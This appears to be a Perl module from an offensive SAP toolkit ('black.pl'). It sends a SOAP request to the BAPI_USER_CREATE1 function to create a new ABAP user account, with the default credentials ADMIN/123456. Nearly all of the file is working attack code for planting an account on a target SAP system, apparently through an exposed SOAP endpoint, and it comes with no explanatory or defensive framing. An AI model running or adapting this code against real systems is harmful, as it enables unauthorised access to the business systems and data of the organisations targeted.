#!/usr/bin/perl
# Module Create ABAP user

# CONFIG
######################
my $desc ="Add ABAP user (BAPI_USER_CREATE1) \n\t Usage: black.pl .. .. $argv[5] [user] [password] [name] [last_name]\n\t <user> <password> <name> <last_name> -  name, password, first and last name for new ABAP user, default is ADMIN:123456:test:test\n"; 
our $funcName="add_abap_user";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub add_abap_user()
{
	my $XML='<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">
     <SOAP-ENV:Header/>
     <SOAP-ENV:Body>
        <BAPI_USER_CREATE1 xmlns="urn:sap-com:document:sap:rfc:functions">
		<ADDRESS>
              <FIRSTNAME>%ABAP_FIRST%</FIRSTNAME>
             <LASTNAME>%ABAP_LAST%</LASTNAME>
			 </ADDRESS>
		<PASSWORD>
             <BAPIPWD>%ABAP_PASSWORD%</BAPIPWD>
           </PASSWORD>
           <USERNAME>%ABAP_USER%</USERNAME>
        </BAPI_USER_CREATE1>
     </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
';
	if ($ARGV[$m_arg_i+1]){
		$abap_user=$ARGV[$m_arg_i+1];
		print $abap_user." - abap_user \n\n";
	} else {
		$abap_user='ADMIN';
	}

	if ($ARGV[$m_arg_i+2]){
		$abap_pass=$ARGV[$m_arg_i+2];
		print $abap_pass." - abap_pass \n\n";	
	} else {
		$abap_pass='123456';
	}
	
	if ($ARGV[$m_arg_i+3]){
		$abap_name=$ARGV[$m_arg_i+3];
		print $abap_name." - abap_name \n\n";		
	} else {
		$abap_name='test';
	}
		
	if ($ARGV[$m_arg_i+4]){
		$abap_lname=$ARGV[$m_arg_i+4];
		print $abap_lname." - abap_lname \n\n";	
	} else {
		$abap_lname='test';
	}
	
	$XML=~s/%ABAP_PASSWORD%/$abap_pass/s;
	$XML=~s/%ABAP_USER%/$abap_user/s;
	$XML=~s/%ABAP_FIRST%/$abap_name/s;
	$XML=~s/%ABAP_LAST%/$abap_lname/s;
	

	my @answers=send_soap($XML,1);

	my $answer=join('', @answers);
	
	print $answer;
	
#	print "*Check manual a creation of user \n\n";
	
	print "\n\n";

}